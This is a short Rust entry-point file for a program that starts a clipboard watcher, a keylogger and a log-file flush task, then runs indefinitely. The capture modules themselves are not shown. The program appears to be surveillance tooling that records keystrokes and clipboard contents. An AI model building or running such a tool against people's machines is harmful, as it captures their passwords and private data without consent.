use std::thread;
use std::time::Duration;

use color_eyre::eyre::Result;

use crate::clipboard::start_clipboard_watcher;
use crate::keylogger::start_keylogger;
use crate::log_file::start_file_flush_task;

mod clipboard;
mod log_file;
mod keylogger;
#[macro_use]
mod log_macros;

fn main() -> Result<()> {
    color_eyre::install()?;

    start_clipboard_watcher();
    start_keylogger();
    start_file_flush_task();

    Ok(thread::sleep(Duration::MAX))
}